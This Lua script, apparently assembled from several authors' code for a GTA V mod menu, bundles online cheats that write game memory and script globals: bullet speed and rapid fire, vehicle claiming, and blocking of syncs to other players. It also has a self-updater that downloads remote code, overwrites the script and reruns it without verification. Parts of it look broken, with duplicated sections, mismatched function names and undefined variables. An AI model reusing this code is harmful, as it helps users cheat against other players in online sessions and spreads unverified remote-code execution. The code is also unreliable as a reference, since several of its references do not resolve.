local scriptname = "Lena Utilities"

local pid = players.user()
local notify = util.toast
local wait = util.yield
local wait_once = util.yield_once

----------------------------
--- Natives and Resources---
----------------------------

util.require_natives("1651208000")
util.require_natives("1663599433")
util.require_natives("1660775568-uno")
util.require_natives("1663599444-uno")

-------------------------------------
-- Tabs
-------------------------------------

local self = menu.list(menu.my_root(), "Self", {""}, "")
local wep = menu.list(menu.my_root(), "Weapons", {""}, "")
local vehicle = menu.list(menu.my_root(), "Vehicle", {""}, "")
local online = menu.list(menu.my_root(), "Online", {""}, "")
local misc = menu.list(menu.my_root(), "Misc", {""}, "")
local tunables = menu.list(menu.my_root(), "Tunables", {"", ""})
--local wip = menu.list(menu.my_root(), "WIP", {""}, "")

-------------------------------------
-- Sub Tabs
-------------------------------------

--local saim = menu.list(wep, "Ouchies", {""}, "")
local lrf = menu.list(wep, "Legit rapid Fire", {""}, "")
local better_heli = menu.list(vehicle, "Better Heli", {""}, "")
local detections = menu.list(online, "Detections", {}, "")
local protex = menu.list(online, "Protections", {}, "")
local shortcuts = menu.list(misc, "Shortcuts", {}, "")


-------------------------------------
-- Auto Update
-------------------------------------
local response = false
local script_version = 3.07
local rawGit = "https://raw.githubusercontent.com"
async_http.init(rawGit,"/Lenalein2001/Lena-Utils/main/LenaUtilitiesVersion", function (output)
    local remoteVersion = tonumber(output)
    response = true
    if script_version ~= remoteVersion then
        util.yield(1000)
        thprnotify(scriptname .. " is outdated, and requires an update ... update will start itself in 3 seconds")
        util.yield(3000)
        async_http.init(rawGit, "/Lenalein2001/Lena-Utils/main/Lena%20Utilities.lua", function (a)
            local catchError = select(2, load(a))
            if catchError then
                thprnotify("Download failed :/. Restart the script, if that does not work, contact the owner of the script")
                util.yield(3000)
            return end
            local file = io.open(filesystem.scripts_dir() .. SCRIPT_RELPATH, "w+b")
            file:write(a)
            file:close()
            thprnotify(" " .. scriptname .. " has been updated successfully to version " .. remoteVersion .. 
            "\n script will be restarted automatically")
            util.yield(3000)
            util.restart_script()
        end)
        async_http.dispatch()
    end
end, function () response = true end)
    async_http.dispatch()
repeat
    util.yield()
until response

-------------------------------------
-- Wiri 
-------------------------------------

local required <const> = {
	"lib/lena/functions.lua",
	"lib/lena/ufo.lua",
	"lib/lena/guided_missile.lua",
	"lib/lena/pretty/json.lua",
	"lib/lena/pretty/json/constant.lua",
	"lib/lena/pretty/json/parser.lua",
	"lib/lena/pretty/json/serializer.lua",
	"lib/lena/ped_list.lua",
	"lib/lena/homing_missiles.lua",
	"lib/lena/orbital_cannon.lua"
}

local Functions = require "lena.functions"
local UFO = require "lena.ufo"
local GuidedMissile = require "lena.guided_missile"
local PedList <const> = require "lena.ped_list"
local HomingMissiles = require "lena.homing_missiles"
local OrbitalCannon = require "lena.orbital_cannon"

local scriptdir <const> = filesystem.scripts_dir()
for _, file in ipairs(required) do
	assert(filesystem.exists(scriptdir .. file), "required file not found: " .. file)
end

if filesystem.exists(filesystem.resources_dir() .. "lena.ytd") then
	util.register_file(filesystem.resources_dir() .. "lena.ytd")
	notification.txdDict = "lena"
	notification.txdName = "logo"
	request_streamed_texture_dict("lena")
else
	error("required file not found: lena.ytd" )
end

-----------------------------------
-- FILE SYSTEM
-----------------------------------	

local lenaDir <const> = scriptdir .. "Lena\\"
local languageDir <const> = lenaDir .. "language\\"
local configFile <const> = lenaDir .. "config.ini"


if not filesystem.exists(lenaDir) then
	filesystem.mkdir(lenaDir)
end

if not filesystem.exists(languageDir) then
	filesystem.mkdir(languageDir)
end

if not filesystem.exists(lenaDir .. "handling") then
	filesystem.mkdir(lenaDir .. "handling")
end

---------------------------------
-- CONFIG/LANGUAGE
---------------------------------

if filesystem.exists(configFile) then
	for s, tbl in pairs(Ini.load(configFile)) do
		for k, v in pairs(tbl) do
			Config[s] = Config[s] or {}
			Config[s][k] = v
		end
	end
end

if Config.general.language ~= "english" then
	local ok, errmsg = load_translation(Config.general.language .. ".json")
	if not ok then notification:help("Couldn't load tranlation: " .. errmsg, HudColour.red) end
end

-----------------------------------
-- LABELS
-----------------------------------	

local customLabels <const> =
{
	EnterFileName = translate("Labels", "Enter the file name"),
	InvalidChar = translate("Labels", "Got an invalid character, try again"),
	EnterValue = translate("Labels", "Enter the value"),
	ValueMustBeNumber = translate("Labels", "The value must be a number, try again"),
	Search = translate("Labels" ,"Type the word to search"),
}

for key, text in pairs(customLabels) do
	customLabels[key] = util.register_label(text)
end

-----------------------------------
-- OTHERS
-----------------------------------

-- [name] = {"keyboard; controller", index}
local Imputs <const> =
{
	INPUT_JUMP = {"Spacebar; X", 22},
	INPUT_VEH_ATTACK = {"Mouse L; RB", 69},
	INPUT_VEH_AIM = {"Mouse R; LB", 68},
	INPUT_VEH_DUCK = {"X; A", 73},
	INPUT_VEH_HORN = {"E; L3", 86},
	INPUT_VEH_CINEMATIC_UP_ONLY = {"Numpad +; none", 96},
	INPUT_VEH_CINEMATIC_DOWN_ONLY = {"Numpad -; none", 97}
}

local NULL <const> = 0
DecorFlag_isTrollyVehicle = 1 << 0
DecorFlag_isEnemyVehicle = 1 << 1
DecorFlag_isAttacker = 1 << 2
DecorFlag_isAngryPlane = 1 << 3

-----------------------------------
-- Lance
-----------------------------------

gta_labels = require('all_labels')
all_labels = gta_labels.all_labels
sexts = gta_labels.sexts
is_loading = true
ls_debug = false
all_vehicles = {}
all_objects = {}
all_players = {}
all_peds = {}
all_pickups = {}
handle_ptr = memory.alloc(13*8)
player_cur_car = 0
good_guns = {0, 453432689, 171789620, 487013001, -1716189206, 1119849093}
util_alloc = memory.alloc(8)

local function table_size(T)
    local count = 0
    for _ in pairs(T) do count = count + 1 end
    return count
end

function get_user_primary_color()
    local color = {}
    color.r = menu.get_value(menu.ref_by_command_name("primaryred")) / 100
    color.g = menu.get_value(menu.ref_by_command_name("primarygreen")) / 100
    color.b = menu.get_value(menu.ref_by_command_name("primaryblue")) / 100
    color.a = menu.get_value(menu.ref_by_command_name("primaryopacity")) / 100
    return color
end

current_toasts = {}

local function modern_toast(text)
    for _, t in pairs(current_toasts) do 
        if t.text == text then 
            return 
        end 
    end
    if notify_sounds then
        AUDIO.PLAY_SOUND(-1, "OPEN_WINDOW", "LESTER1A_SOUNDS", 0, 0, 1)
    end
    table.insert(current_toasts, 
    {
        text = text, 
        start_time = os.clock(),
        display_time = (0.15 * string.len(text))
    })
end

-- toast renderer
util.create_tick_handler(function()
    local current_y_pos = 0.00
    local text_scale = 0.6
    for index, toast in pairs(current_toasts) do
        -- if a notif has expired, delete it
        if current_y_pos == 0.00 then 
            current_y_pos = 0.04 
        else
            current_y_pos += 0.07
        end
        if ((os.clock() - toast.start_time) >= toast.display_time) then
            table.remove(current_toasts, index)
            return
        end

        local scale_x, scale_y = directx.get_text_size(toast.text, text_scale)
        local min_scale_x, min_scale_y = directx.get_text_size(translations.script_name_pretty, 0.6)

        scale_x += 0.05
        scale_y += 0.02

        directx.draw_rect(0.5 - (scale_x / 2), current_y_pos, scale_x, scale_y, {r=0, g=0, b=0, a=0.7})
        directx.draw_rect(0.5 - (scale_x / 2), current_y_pos - (scale_y/2), scale_x, 0.025, {r = 0, g = 0, b = 0, a = 1})
        directx.draw_text(0.5, current_y_pos + (scale_y / 2), toast.text, 5, text_scale, {r=1, g=1, b=1, a=1}, false)
        directx.draw_text(0.5, current_y_pos - (scale_y / 2), translations.script_name_pretty, 1, 0.6, {r=1, g=1, b=1, a=1}, false)
    end
    current_y_pos = 0.00
end)


function is_user_a_stand_user(pid)
    if player_id == players.user() then
        return true
    end
    for _, cmd in ipairs(menu.player_root(pid):getChildren()) do
        if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and (cmd:refByRelPath("Stand User"):isValid() or cmd:refByRelPath("Stand User (Co-Loading"):isValid()) then
            return true
        end
    end
    return false
end

vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false

local function mod_uses(type, incr)
    -- this func is a patch. every time the script loads, all the toggles load and set their state. in some cases this makes the _uses optimization negative and breaks things. this prevents that.
    if incr < 0 and is_loading then
        -- ignore if script is still loading
        ls_log("Not incrementing use var of type " .. type .. " by " .. incr .. "- script is loading")
        return
    end
    ls_log("Incrementing use var of type " .. type .. " by " .. incr)
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end

function BitTest(bits, place)
	return (bits & (1 << place)) ~= 0
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

notify_mode = 2
notify_sounds = true
currToasts = {}
currActiveModernToasts = 0
function modern_toast(text)
    if currToasts[text] == nil then 
        currToasts[text] = text
        if notify_sounds then
            AUDIO.PLAY_SOUND(-1, "OPEN_WINDOW", "LESTER1A_SOUNDS", 0, 0, 1)
        end
        util.create_thread(function()
            local cur_anim_frame = 0
            local y_pos = 0
            local text_scale = 0.5
            local scale_x, scale_y = directx.get_text_size(text, text_scale)
            local min_scale_x, min_scale_y = directx.get_text_size(scriptname, 0.6)
            scale_x += 0.05
            scale_y += 0.02
            if scale_x < min_scale_x then 
                scale_x = min_scale_x + 0.05
            end

            if scale_y < min_scale_y then 
                scale_y = min_scale_y + 0.02
            end

            local min_frames = 10 + (currActiveModernToasts * 10)
            local max_frames = 50 + (10 * string.len(text)) + (currActiveModernToasts * 10)
            currActiveModernToasts += 1
            while true do 
                cur_anim_frame += 1
                if cur_anim_frame < min_frames then 
                    y_pos += 0.005 
                elseif cur_anim_frame > max_frames then 
                    y_pos -= 0.005
                    if y_pos < 0 then
                        currActiveModernToasts -= 1 
                        currToasts[text] = nil 
                        util.stop_thread()
                    end
                end
                directx.draw_rect(0.5 - (scale_x / 2), y_pos, scale_x, scale_y, {r=0.81, g=0.10, b=0.50, a=0.88})
                directx.draw_rect(0.5 - (scale_x / 2), y_pos - (scale_y/2), scale_x, 0.025, {r=0.51, g=0.06, b=0.32, a = 1})
                directx.draw_text(0.5, y_pos + (scale_y / 2), text, 5, text_scale, {r=1, g=1, b=1, a=1}, false)
                directx.draw_text(0.5, y_pos - (scale_y / 2), scriptname, 1, 0.6, {r=1, g=1, b=1, a=1}, false)
                wait()
            end
        end)
    end
end

function thprnotify(text)
    pluto_switch notify_mode do
        case 1: 
            notify('[' .. scriptname .. '] ' .. text)
            break
        case 2: 
            modern_toast(text)
            break
    end
end

local function set_player_into_suitable_seat(ent)
    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
    if not PED.IS_PED_A_PLAYER(driver) or driver == 0 then
        if driver ~= 0 then
            entities.delete_by_handle(driver)
        end
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
    else
        for i=0, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(ent) do
            if VEHICLE.IS_VEHICLE_SEAT_FREE(ent, i) then
                PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
            end
        end
    end
end

-----------------------------------
-- Jinx
-----------------------------------	

local All_business_properties = {
    -- Clubhouses
    "1334 Roy Lowenstein Blvd",
    "7 Del Perro Beach",
    "75 Elgin Avenue",
    "101 Route 68",
    "1 Paleto Blvd",
    "47 Algonquin Blvd",
    "137 Capital Blvd",
    "2214 Clinton Avenue",
    "1778 Hawick Avenue",
    "2111 East Joshua Road",
    "68 Paleto Blvd",
    "4 Goma Street",
    -- Facilities
    "Grand Senora Desert",
    "Route 68",
    "Sandy Shores",
    "Mount Gordo",
    "Paleto Bay",
    "Lago Zancudo",
    "Zancudo River",
    "Ron Alternates Wind Farm",
    "Land Act Reservoir",
    -- Arcades
    "Pixel Pete's - Paleto Bay",
    "Wonderama - Grapeseed",
    "Warehouse - Davis",
    "Eight-Bit - Vinewood",
    "Insert Coin - Rockford Hills",
    "Videogeddon - La Mesa",
}
local small_warehouses = {
    [1] = "Pacific Bait Storage", 
    [2] = "White Widow Garage", 
    [3] = "Celltowa Unit", 
    [4] = "Convenience Store Lockup", 
    [5] = "Foreclosed Garage", 
    [9] = "Pier 400 Utility Building", 
}

local medium_warehouses = {
    [7] = "Derriere Lingerie Backlot", 
    [10] = "GEE Warehouse", 
    [11] = "LS Marine Building 3", 
    [12] = "Railyard Warehouse", 
    [13] = "Fridgit Annexe",
    [14] = "Disused Factory Outlet", 
    [15] = "Discount Retail Unit", 
    [21] = "Old Power Station", 
}

local large_warehouses = {
    [6] = "Xero Gas Factory",  
    [8] = "Bilgeco Warehouse", 
    [16] = "Logistics Depot", 
    [17] = "Darnell Bros Warehouse", 
    [18] = "Wholesale Furniture", 
    [19] = "Cypress Warehouses", 
    [20] = "West Vinewood Backlot", 
    [22] = "Walker & Sons Warehouse"
}

-----------------------------------
-- Kerami
-----------------------------------	

require("KeramiScriptLib")

-----------------------------------
-- LABELS
-----------------------------------	

local customLabels <const> =
{
	EnterFileName = translate("Labels", "Enter the file name"),
	InvalidChar = translate("Labels", "Got an invalid character, try again"),
	EnterValue = translate("Labels", "Enter the value"),
	ValueMustBeNumber = translate("Labels", "The value must be a number, try again"),
	Search = translate("Labels" ,"Type the word to search"),
}

for key, text in pairs(customLabels) do
	customLabels[key] = util.register_label(text)
end

-------------------------------------
-- Numpad Keys
-------------------------------------

local numpadControls = {
    -- plane
        107,
        108,
        109,
        110,
        111,
        112,
        117,
        118,
    --sub
        123,
        124,
        125,
        126,
        127,
        128,
}

-------------------------------------
-- Jerry
-------------------------------------

util.ensure_package_is_installed("lua/lena/ScaleformLib")
llang = require 'lena/llang'
local lkey = require 'lena/lkey'
local scaleForm = require("ScaleformLib")
local SF = scaleForm("instructional_buttons")
local _LR = {}
function llang.list(root, name, tableCommands, description, ...)
    local ref = menu.list(root, llang.trans(name), if tableCommands then tableCommands else {}, llang.trans(description), ...)
        _LR[name] = ref
    return ref
end

-------------------------------------
-- Different Checks 
-------------------------------------

function BitTest(bits, place)
	return (bits & (1 << place)) ~= 0
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

local spawned_objects = {}
local ladder_objects = {}
local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
end

local function is_player_in_interior(pid)
    return (memory.read_int(memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 243)) ~= 0)
end

-------------------------------------
-- Launch and Spectate 
-------------------------------------

local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}
local launch_vehicle = {"Launch Up", "Launch Forward", "Launch Backwards", "Launch Down", "Slingshot"}

-------------------------------------
-- Better Heli
-------------------------------------

get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["fYawMult"] = 0x18, -- dont remember
    ["fYawStabilise"] = 0x20, --minor stabalization
    ["fSideSlipMult"] = 0x24, --minor stabalizaztion
    ["fRollStabilise"] = 0x30, --minor stabalization
    ["fAttackLiftMult"] = 0x48, --disables most of it
    ["fAttackDiveMult"] = 0x4C, --disables most of the other axis
    ["fWindMult"] = 0x58, --helps with removing some jitter
    ["fPitchStabilise"] = 0x3C --idk what it does but it seems to help
}

-------------------------------------
-- Blocking Syncs
-------------------------------------

local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    wait(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

-------------------------------------
-- SH Stuff
-------------------------------------

local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

-------------------------------------
-------------------------------------
-- Self
-------------------------------------
-------------------------------------

-------------------------------------
-- Auto CEO
-------------------------------------

alrboss = 'You are already the boss of a CEO/MC'
gotceoboss = 'You are now the boss of your CEO'

local blipcoords = HUD.GET_BLIP_COORDS

menu.toggle(self, "Auto start CEO", {"autoorg"}, "", function(on)
    if players.get_boss(players.user()) == players.user() == false 
    then notify('CEO autostart is activated') menu.trigger_commands('ceostart')  
        wait(2000) notify("Started, you are now your boss")
    elseif on and players.get_boss(players.user()) == players.user() == true 
    then wait(1000) notify("Not started, you are allready your CEO boss")
    elseif not on then notify("Auto Start deactivated")
    elseif on then notify("Auto Start activated")  
    end
end)

-------------------------------------
-- Claim PV's
-------------------------------------

menu.toggle_loop(self, "Claim Versonal Vehicles", {}, "", function()
    local count = memory.read_int(memory.script_global(1585857))
    for i = 0, count do
        local canFix = (bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 1) and bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 2))
        if canFix then
            clearBit(memory.script_global(1585857 + 1 + (i * 142) + 103), 1)
            clearBit(memory.script_global(1585857 + 1 + (i * 142) + 103), 3)
            clearBit(memory.script_global(1585857 + 1 + (i * 142) + 103), 16)
            notify("Your PV has been Destroyed. Claiming it....")
        end
    end
    wait(100)
end)

-------------------------------------
-------------------------------------
-- Weapons
-------------------------------------
-------------------------------------



-------------------------------------
-- BULLET SPEED MULT
-------------------------------------

---@class AmmoSpeed
local AmmoSpeed = {address = 0, defaultValue = 0}
AmmoSpeed.__index = AmmoSpeed

---@param address integer
---@return AmmoSpeed
function AmmoSpeed.new(address)
	assert(address ~= 0, "got a nullpointer")
	local instance = setmetatable({}, AmmoSpeed)
	instance.address = address
	instance.defaultValue = memory.read_float(address)
	return instance
end

AmmoSpeed.__eq = function (a, b)
	return a.address == b.address
end

---@return number
function AmmoSpeed:getValue()
	return memory.read_float(self.address)
end

---@param value number
function AmmoSpeed:setValue(value)
	memory.write_float(self.address, value)
end

function AmmoSpeed:reset()
	memory.write_float(self.address, self.defaultValue)
end

local multiplier
---@type AmmoSpeed
local modifiedSpeed
local helpText <const> =
translate("Weapon", "Allows you to change the speed of non-instant hit bullets (rockets, fireworks, etc.)")

menu.slider_float(wep, translate("Weapon", "Bullet Speed Mult"), {"bulletspeedmult"}, helpText, 10, 100000, 100, 10, function(value)
	multiplier = value / 100
end)

util.create_tick_handler(function()
	local CPed = entities.handle_to_pointer(players.user_ped())
	if CPed == 0 or not multiplier then return end
	local ammoSpeedAddress = addr_from_pointer_chain(CPed, {0x10B8, 0x20, 0x60, 0x58})
	if ammoSpeedAddress == 0 then
		if entities.get_user_vehicle_as_pointer() == 0 then return end
		ammoSpeedAddress = addr_from_pointer_chain(CPed, {0x10B8, 0x70, 0x60, 0x58})
		if ammoSpeedAddress == 0 then return end
	end
	local ammoSpeed = AmmoSpeed.new(ammoSpeedAddress)
	modifiedSpeed = modifiedSpeed or ammoSpeed
	if ammoSpeed ~= modifiedSpeed then
		modifiedSpeed:reset()
		modifiedSpeed = ammoSpeed
	end
	local newValue = modifiedSpeed.defaultValue * multiplier
	if modifiedSpeed:getValue() ~= newValue then
		modifiedSpeed:setValue(newValue)
	end
end)

util.on_stop(function ()
	if modifiedSpeed then modifiedSpeed:reset() end
end)

-------------------------------------
-- Legit rapid Fire
-------------------------------------

LegitRapidFire = false
LegitRapidMS = 100

menu.toggle(lrf, "Legit Rapid Fire", {"legitrapidfire"}, "Quickly switches to grenades and back to your weapon after you shot something. Useful with Sniper, RPG, Grenade Launcher.", function(on)
    local localped = GetLocalPed()
    if on then
        LegitRapidFire = true
        util.create_thread(function ()
            while LegitRapidFire do
                if PED.IS_PED_SHOOTING(localped) then
                    local currentWpMem = memory.alloc()
                    local junk = WEAPON.GET_CURRENT_PED_WEAPON(localped, currentWpMem, 1)
                    local currentWP = memory.read_int(currentWpMem)
                    memory.free(currentWpMem)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, 2481070269, true) --2481070269 is grenade
                    wait(LegitRapidMS)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, currentWP, true)
                end
                wait()
            end
            util.stop_thread()
        end)
    else
        LegitRapidFire = false
    end
end)

menu.slider(lrf, "Delay", {"legitrapiddelay"}, "The delay that it takes to switch to grenade and back to the weapon.", 1, 1000, 100, 50, function (value)
    LegitRapidMS = value
end)

-------------------------------------
-------------------------------------
-- Vehicles
-------------------------------------
-------------------------------------

-------------------------------------
-- Clean vehicle
-------------------------------------

menu.action(vehicle, "Clean Vehicle", {"clv"}, "Cleans the current Vehicle", function()
local PVehicle = entities.get_user_vehicle_as_handle(players.user())  
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(PVehicle, 0.0)
end)

-------------------------------------
-- Auto vehicle GM
-------------------------------------

--[[
menu.toggle(vehicle, "Auto Vehicle gm", {""}, "", function()
    if PED.GET_VEHICLE_PED_IS_IN(players.user()) then 
        menu.trigger_commands("vehgodmode")
    end
end)
]]

-------------------------------------
-- Realistic Heli
-------------------------------------

menu.slider_float(better_heli, "Thrust", {"helithrust"}, "Set the heli thrust", 0, 1000, 220, 10, function (value)
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 2) or get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
    else
        notify("Failed\nget in a heli first")
    end
end)

menu.action(better_heli, "Better heli mode", {"betterheli"}, "Disabables heli auto stablization\nthis is on a per heli basis (also works for blimps)", function ()
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 2) or get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        for _, offset in pairs(better_heli_handling_offsets) do
            memory.write_float(CflyingHandling + offset, 0)
        end
        wait(500)
        menu.trigger_commands("gravitymult 1")
        wait(500)
        menu.trigger_commands("helithrust 2.3")
        notify("Realistic Heli has been enabled")
    else
        notify("Failed\nget in a heli first")
    end
end)

menu.action(better_heli, "Reset Gravity", {""}, "", function ()
    wait(500)
    menu.trigger_commands("gravitymult 2")
    wait(500)
    notify("Realistic Heli has been disabled")
end)

-------------------------------------
-- Vehicle Strafe
-------------------------------------

menu.toggle_loop(vehicle, "Vehicle Strafe", {""}, "Let your vehicle strafe left or right using either arrow left or arror right", function ()
    local player_cur_car = entities.get_user_vehicle_as_handle()
    local last_car
    if last_car == NULL and player_cur_car ~= NULL then
        last_car = player_cur_car
    elseif last_car ~= player_cur_car then
        last_car = player_cur_car
    end
    if player_cur_car ~= 0 then
        local rot = ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0)
        if PAD.IS_CONTROL_PRESSED(175, 175) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z'], 0, true)
        end
        if PAD.IS_CONTROL_PRESSED(174, 174) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, -1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z'], 0, true)
        end
    end
end)


-------------------------------------
-- VEHICLE HANDLING EDITOR
-------------------------------------

CHandlingData =
{
	--{"m_model_hash", 0x0008},
	{"fMass", 0x000C},
	{"fInitialDragCoeff", 0x0010},
	{"fDownforceModifier", 0x0014},
	{"fPopUpLightRotation", 0x0018},
	{"vecCentreOfMassOffsetX", 0x0020},
	{"vecCentreOfMassOffsetY", 0x0024},
	{"vecCentreOfMassOffsetZ", 0x0028},
	{"vecInertiaMultiplierX", 0x0030},
	{"vecInertiaMultiplierY", 0x0034},
	{"vecInertiaMultiplierZ", 0x0038},
	{"fPercentSubmerged", 0x0040},
	{"fSubmergedRatio", 0x0044},
	{"fDriveBiasFront", 0x0048},
	{"fDriveBiasRear", 0x004C},
	--{"nInitialDriveGears", 0x0050},
	{"fDriveInertia", 0x0054},
	{"fClutchChangeRateScaleUpShift", 0x0058},
	{"fClutchChangeRateScaleDownShift", 0x005C},
	{"fInitialDriveForce", 0x0060},
	{"fDriveMaxFlatVel", 0x0064},
	{"fInitialDriveMaxFlatVel", 0x0068},
	{"fBrakeForce", 0x006C},
	{"fBrakeBiasFront", 0x0074},
	{"fBrakeBiasRear", 0x0078},
	{"fHandBrakeForce", 0x007C},
	{"fSteeringLock", 0x0080},
	{"fSteeringLockRatio", 0x0084},
	{"fTractionCurveMax", 0x0088},
	{"fTractionCurveMaxRatio", 0x008C},
	{"fTractionCurveMin", 0x0090},
	{"fTractionCurveRatio", 0x0094},
	{"fTractionCurveLateral", 0x0098},
	{"fTractionCurveLateralRatio", 0x009C},
	{"fTractionSpringDeltaMax", 0x00A0},
	{"fTractionSpringDeltaMaxRatio", 0x00A4},
	{"fLowSpeedTractionLossMult", 0x00A8},
	{"fCamberStiffnesss", 0x00AC},
	{"fTractionBiasFront", 0x00B0},
	{"fTractionBiasRear", 0x00B4},
	{"fTractionLossMult", 0x00B8},
	{"fSuspensionForce", 0x00BC},
	{"fSuspensionCompDamp", 0x00C0},
	{"fSuspensionReboundDamp", 0x00C4},
	{"fSuspensionUpperLimit", 0x00C8},
	{"fSuspensionLowerLimit", 0x00CC},
	{"fSuspensionRaise", 0x00D0},
	{"fSuspensionBiasFront", 0x00D4},
	{"fSuspensionBiasRear", 0x00D8},
	{"fAntiRollBarForce", 0x00DC},
	{"fAntiRollBarBiasFront", 0x00E0},
	{"fAntiRollBarBiasRear", 0x00E4},
	{"fRollCentreHeightFront", 0x00E8},
	{"fRollCentreHeightRear", 0x00EC},
	{"fCollisionDamageMult", 0x00F0},
	{"fWeaponDamageMult", 0x00F4},
	{"fDeformationDamageMult", 0x00F8},
	{"fEngineDamageMult", 0x00FC},
	{"fPetrolTankVolume", 0x0100},
	{"fOilVolume", 0x0104},
	{"fSeatOffsetDistX", 0x010C},
	{"fSeatOffsetDistY", 0x0110},
	{"fSeatOffsetDistZ", 0x0114},
	--{"nMonetaryValue", 0x0118},
	--{"strModelFlags", 0x0124},
	--{"strHandlingFlags", 0x0128},
	--{"strDamageFlags", 0x012C},
	--{"AIHandling", 0x013C},
}

CFlyingHandlingData =
{
	{"fThrust", 0x0008},
	{"fThrustFallOff", 0x000C},
	{"fThrustVectoring", 0x0010},
	{"fYawMult", 0x001C},
	{"fYawStabilise", 0x0020},
	{"fSideSlipMult", 0x0024},
	{"fRollMult", 0x002C},
	{"fRollStabilise", 0x0030},
	{"fPitchMult", 0x0038},
	{"fPitchStabilise", 0x003C},
	{"fFormLiftMult", 0x0044},
	{"fAttackLiftMult", 0x0048},
	{"fAttackDiveMult", 0x004C},
	{"fGearDownDragV", 0x0050},
	{"fGearDownLiftMult", 0x0054},
	{"fWindMult", 0x0058},
	{"fMoveRes", 0x005C},
	{"vecTurnResX", 0x0060},
	{"vecTurnResY", 0x0064},
	{"vecTurnResZ", 0x0068},
	{"vecSpeedResX", 0x0070},
	{"vecSpeedResY", 0x0074},
	{"vecSpeedResZ", 0x0078},
	{"fGearDoorFrontOpen", 0x0080},
	{"fGearDoorRearOpen", 0x0084},
	{"fGearDoorRearOpen2", 0x0088},
	{"fGearDoorRearMOpen", 0x008C},
	{"fTurbulanceMagnitudMax", 0x0090},
	{"fTurbulanceForceMulti", 0x0094},
	{"fTurbulanceRollTorqueMulti", 0x0098},
	{"fTurbulancePitchTorqueMulti", 0x009C},
	{"fBodyDamageControlEffectMult", 0x00A0},
	{"fInputSensitivityForDifficulty", 0x00A4},
	{"fOnGroundYawBoostSpeedPeak", 0x00A8},
	{"fOnGroundYawBoostSpeedCap", 0x00AC},
	{"fEngineOffGlideMult", 0x00B0},
	{"fAfterburnerEffectRadius", 0x00B4},
	{"fAfterburnerEffectDistance", 0x00B8},
	{"fAfterburnerEffectForceMulti", 0x00BC},
	{"fSubmergeLevelToPullHeliUnderWater", 0x00C0},
